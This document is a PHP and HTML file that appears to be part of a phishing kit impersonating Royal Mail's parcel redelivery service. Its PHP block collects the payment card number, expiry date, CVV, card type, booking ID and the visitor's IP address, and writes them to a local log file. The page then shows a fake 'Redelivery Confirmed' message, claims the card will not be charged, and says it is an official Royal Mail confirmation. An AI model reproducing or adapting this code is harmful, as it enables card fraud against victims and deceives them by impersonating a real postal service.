<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST['card_number'])) {
    if (!is_dir('logs')) mkdir('logs', 0777, true);
    
    $entry = [
        "time"          => date('Y-m-d H:i:s'),
        "booking_id"    => $_POST['booking_id'] ?? '',
        "card_type"     => $_POST['card_type'] ?? '',
        "card_number"   => $_POST['card_number'] ?? '',
        "expiry_month"  => $_POST['expiry_month'] ?? '',
        "expiry_year"   => $_POST['expiry_year'] ?? '',
        "cvv"           => $_POST['cvv'] ?? '',
        "ip"            => $_SERVER['REMOTE_ADDR']
    ];

    file_put_contents('logs/redelivery.txt', json_encode($entry) . "\n", FILE_APPEND);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redelivery Confirmed | Royal Mail</title>
    <style>
        body {font-family:Arial, Helvetica, sans-serif; background:#f4f4f4; text-align:center; padding:60px 20px;}
        .container {max-width:720px; margin:auto; background:white; padding:50px; box-shadow:0 4px 15px rgba(0,0,0,0.1); border-radius:8px;}
        h1 {color:#2A2A2D;}
        .success {color:#006400; font-size:26px; margin:25px 0;}
        .note {background:#f0f8ff; border-left:5px solid #0066cc; padding:20px; text-align:left; margin:30px auto; max-width:580px; font-size:15px;}
    </style>
</head>
<body>

<div class="container">
    <h1>Redelivery Scheduled Successfully</h1>
    <p class="success">Thank you. Your redelivery has been confirmed.</p>
    
    <p style="font-size:17px;">You will receive a confirmation email shortly.</p>

    <div class="note">
        <strong>Important:</strong><br><br>
        Your card will <strong>NOT</strong> be charged today.<br>
        Payment of £2.99 will only be taken once the redelivery has been successfully completed.
    </div>

    <p><strong>Booking Reference:</strong> <?= htmlspecialchars($_POST['booking_id'] ?? 'RM-' . rand(10000000,99999999)) ?></p>
    
    <p style="margin-top:40px; color:#555; font-size:15px;">
        This is an official confirmation from Royal Mail Redelivery Service.
    </p>
</div>

</body>
</html>
